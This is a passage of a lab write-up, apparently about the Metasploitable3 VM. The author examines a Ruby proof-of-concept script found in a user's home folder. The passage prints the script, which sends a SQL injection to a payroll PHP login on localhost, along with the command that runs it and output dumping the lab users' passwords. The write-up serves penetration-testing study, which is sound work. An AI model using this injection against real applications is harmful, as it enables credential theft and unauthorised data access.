&lt;h4 id=&quot;kylo-rens-ruby-exploit&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kylo-rens-ruby-exploit&quot; aria-label=&quot;kylo rens ruby exploit permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kylo Ren’s Ruby Exploit&lt;/h4&gt;
&lt;p&gt;It would make the most logical sense to start with the PHP source code for the website… However, I am fascinated by what is in &lt;code class=&quot;language-text&quot;&gt;kylo_ren&lt;/code&gt;s home folder. A quick listing of the folder revealed one file called: &lt;code class=&quot;language-text&quot;&gt;poc.rb&lt;/code&gt;, that had the following contents:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;ruby&quot;&gt;&lt;pre class=&quot;language-ruby&quot;&gt;&lt;code class=&quot;language-ruby&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;net/http&apos;&lt;/span&gt;

url  &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;http://127.0.0.1/payroll_app.php&quot;&lt;/span&gt;
uri  &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
user &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;luke_skywalker&apos;&lt;/span&gt;
injection &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;password&apos;; select password from users where username=&apos;&apos; OR &apos;&apos;=&apos;&quot;&lt;/span&gt;

puts &lt;span class=&quot;token string&quot;&gt;&quot;Making POST request to &lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token delimiter tag&quot;&gt;#{&lt;/span&gt;uri&lt;span class=&quot;token delimiter tag&quot;&gt;}&lt;/span&gt;&lt;/span&gt; with the following parameters:&quot;&lt;/span&gt;
puts &lt;span class=&quot;token string&quot;&gt;&quot;&apos;user&apos; = &lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token delimiter tag&quot;&gt;#{&lt;/span&gt;user&lt;span class=&quot;token delimiter tag&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;
puts &lt;span class=&quot;token string&quot;&gt;&quot;&apos;password&apos; = &lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token delimiter tag&quot;&gt;#{&lt;/span&gt;injection&lt;span class=&quot;token delimiter tag&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;
res &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;post_form&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uri&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;user&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; user&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; injection&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;s&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;OK&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

puts &lt;span class=&quot;token string&quot;&gt;&quot;Response body is &lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token delimiter tag&quot;&gt;#{&lt;/span&gt;res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;body&lt;span class=&quot;token delimiter tag&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;
puts &lt;span class=&quot;token string&quot;&gt;&quot;Done&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Considering that Kylo is neck-deep in the dark side, it comes as no surprise he has a malicious Ruby script that attacks the &lt;em&gt;Payroll App&lt;/em&gt; website. The script automates a similar attack to what we performed earlier. Kylo uses the username &lt;code class=&quot;language-text&quot;&gt;luke_skywalker&lt;/code&gt; and a password that is a SQL injection attack. The actual SQL Injection entered is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;password&apos;; select password from users where username=&apos;&apos; OR &apos;&apos;=&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Comparing this to the initial attack we performed early is interesting. It also revealed some more useful information about the SQL Injection vulnerability. Turns out, an attacker can enter any username and password combination on the page and review results. I initially thought that a user would have to authenticate (with username and password) before any information was displayed. Turns out that the web application returns an empty table when the incorrect username and password are entered. Interesting.&lt;/p&gt;
&lt;p&gt;Anyway, the resultant output of the attack lists all the passwords for the users in the database. However, it does not list the username next to the password, so some guessing and/or correlation needs to be performed. To run the script, use the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;leia_organa@metasploitable3-ub1404:/home/kylo_ren/poc/payroll_app$ ruby poc.rb &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The output of the script is listed below, with some formatting applied to the HTML portion to enhance readability:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;Making POST request to http://127.0.0.1/payroll_app.php with the following parameters:
&apos;user&apos; = luke_skywalker
&apos;password&apos; = password&apos;; select password from users where username=&apos;&apos; OR &apos;&apos;=&apos;
Response body is 

&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;center&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Welcome, luke_skywalker&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;table&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token value css language-css&quot;&gt;&lt;span class=&quot;token property&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 2px solid black&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;cellspacing&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Username&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;First Name&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Last Name&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Salary&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;center&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Welcome, luke_skywalker&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;table&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token value css language-css&quot;&gt;&lt;span class=&quot;token property&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 2px solid black&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;cellspacing&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Username&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;First Name&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Last Name&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Salary&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;th&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;help_me_obiwan&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;like_my_father_beforeme&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;nerf_herder&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;b00p_b33p&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Pr0t0c07&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;thats_no_m00n&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Dark_syD3&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;but_master:(&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mesah_p@ssw0rd&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;td&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;tr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
